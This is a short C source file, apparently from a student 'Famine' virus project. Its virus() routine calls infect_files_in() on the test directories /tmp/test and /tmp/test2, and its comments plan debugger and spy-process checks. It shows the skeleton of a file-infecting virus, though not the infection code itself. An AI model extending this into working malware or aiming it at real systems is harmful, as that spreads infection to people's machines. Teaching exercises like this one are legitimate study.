/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/04 03:53:01 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <sys/types.h>
#include "famine.h"

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))

void	virus()
{
	const char *playgrounds[] =
	{
		"/tmp/test",
		"/tmp/test2"
	};

	for (size_t i = 0; i < ARRAY_SIZE(playgrounds); i++)
	{
		infect_files_in(playgrounds[i]);
	}
}

void		famine()
{
	// check debugger
	// check spy process
	virus();
	// return to entry
}
